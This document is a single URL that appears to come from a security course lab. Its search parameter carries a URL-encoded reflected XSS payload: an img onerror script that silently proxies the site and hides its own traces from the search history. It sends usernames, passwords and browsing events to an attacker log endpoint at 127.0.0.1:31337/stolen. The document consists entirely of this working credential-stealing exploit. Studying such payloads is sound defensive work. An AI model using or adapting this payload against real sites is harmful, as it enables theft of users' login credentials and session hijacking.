http://permalink.co:8080/search?xssdefense=2&q=%3Cimg%20src%3D%27x%27%20onerror%3D%27%20function%20payload(attacker)%20%7B%0A%09%2F%2F%20Token%20for%20filter%20defc72a96803a619a6735cd7e7e69e1b%0A%09function%20log(attacker%2C%20data)%20%7B%0A%09%09console.log(%24.param(data))%3B%0A%09%09%24.get(attacker%2C%20data)%3B%0A%09%7D%0A%09function%20proxy(attacker%2C%20href%2C%20ifPushState)%20%7B%0A%09%09%24(%22html%22).load(href%2C%20function()%7B%0A%09%09%09var%20user%20%3D%20%24(%22%23logged-in-user%22)%3B%0A%09%09%09var%20username%20%3D%20user.text()%3B%0A%0A%09%09%09%24(%22html%22).show()%3B%0A%0A%09%09%09if%20(username%20%3D%3D%20%22%22)%20%7B%0A%09%09%09%09log(attacker%2C%20%7Bevent%3A%20%22nav%22%2C%20uri%3A%20href%7D)%3B%0A%09%09%09%7D%20else%20%7B%0A%09%09%09%09log(attacker%2C%20%7Bevent%3A%20%22nav%22%2C%20user%3A%20username%2C%20uri%3A%20href%7D)%3B%0A%09%09%09%7D%0A%0A%09%09%09filterSearch()%3B%0A%09%09%09handleClick()%3B%0A%09%09%09if%20(ifPushState)%20%7B%0A%09%09%09%09history.pushState(href%2C%20document.title%2C%20href)%3B%0A%09%09%09%7D%0A%09%09%7D)%3B%0A%09%7D%0A%0A%09function%20handleClick()%20%7B%0A%09%09%24(%22%23search-btn%22).click(onSearch)%3B%0A%09%09%24(%22%23search-again-btn%22).click(onSearchAgain)%3B%0A%09%09%24(%22%23log-in-btn%22).click(onLogin)%3B%0A%09%09%24(%22%23new-account-btn%22).click(onCreate)%3B%0A%09%09%24(%22%23log-out-btn%22).click(onLogout)%3B%0A%09%7D%0A%0A%09function%20filterSearch()%20%7B%0A%09%09var%20historyList%20%3D%20%24(%22%23history-list%20a%22)%3B%0A%09%09if%20(historyList.length%20%3D%3D%200)%20%7B%0A%09%09%09return%3B%0A%09%09%7D%0A%09%09for%20(var%20i%20%3D%200%3B%20i%20%3C%20historyList.length%3B%20i%2B%2B)%20%7B%0A%09%09%09if%20(historyList%5Bi%5D.text.indexOf(%22defc72a96803a619a6735cd7e7e69e1b%22)%20!%3D%20-1)%20%7B%0A%09%09%09%09historyList%5Bi%5D.style.display%20%3D%20%22none%22%3B%0A%09%09%09%7D%0A%09%09%7D%0A%09%7D%0A%0A%09function%20onSearch(event)%20%7B%0A%09%09var%20query%20%3D%20%24(%22%23query%22).val()%3B%0A%09%09var%20url%20%3D%20%22.%2Fsearch%3Fq%3D%22%20%2B%20query%3B%0A%09%09proxy(attacker%2C%20url%2C%20true)%3B%0A%09%09event.preventDefault()%3B%0A%09%7D%0A%0A%09function%20onSearchAgain(event)%20%7B%0A%09%09proxy(attacker%2C%20%22.%2F%22%2C%20true)%3B%0A%09%09event.preventDefault()%3B%0A%09%7D%0A%0A%09function%20onLogin(event)%20%7B%0A%09%09loginHelper(%22.%2Flogin%22)%3B%0A%09%09event.preventDefault()%3B%0A%09%7D%0A%0A%09function%20onCreate(event)%20%7B%0A%09%09loginHelper(%22.%2Fcreate%22)%3B%0A%09%09event.preventDefault()%3B%0A%09%7D%0A%0A%09function%20loginHelper(action)%20%7B%0A%09%09var%20username%20%3D%20%24(%22%23username%22).val()%3B%0A%09%09var%20password%20%3D%20%24(%22%23userpass%22).val()%3B%0A%09%09var%20data%20%3D%20%7B%22username%22%3A%20username%2C%20%22password%22%3A%20password%7D%3B%0A%0A%09%09log(attacker%2C%20%7Bevent%3A%20%22login%22%2C%20user%3A%20username%2C%20pass%3A%20password%7D)%3B%0A%09%09%24.post(action%2C%20data%2C%20function()%20%7B%0A%09%09%09proxy(attacker%2C%20%22.%2F%22%2C%20true)%3B%0A%09%09%7D)%0A%09%7D%0A%0A%09function%20onLogout(event)%20%7B%0A%09%09var%20user%20%3D%20%24(%22%23logged-in-user%22)%3B%0A%09%09var%20username%20%3D%20user.text()%3B%0A%09%09log(attacker%2C%20%7Bevent%3A%20%22logout%22%2C%20user%3A%20username%7D)%3B%0A%09%09%24.post(%22.%2Flogout%22%2C%20function()%20%7B%0A%09%09%09proxy(attacker%2C%20%22.%2F%22%2C%20true)%3B%0A%09%09%7D)%3B%0A%09%09event.preventDefault()%3B%0A%09%7D%0A%0A%09function%20bootstrap()%20%7B%0A%09%09var%20url%20%3D%20%22.%2F%22%3B%0A%09%09%24(%22html%22).hide()%3B%0A%09%09proxy(attacker%2C%20url%2C%20false)%3B%0A%09%09history.replaceState(url%2C%20document.title%2C%20url)%3B%0A%09%7D%0A%0A%09window.onpopstate%20%3D%20function(event)%20%7B%0A%20%20%09%09proxy(attacker%2C%20event.state%2C%20false)%3B%0A%09%7D%3B%0A%0A%09bootstrap()%3B%0A%7D%3Bpayload(%22%20http%3A%2F%2F127.0.0.1%3A31337%2Fstolen%22%20)%3B%27%20%3E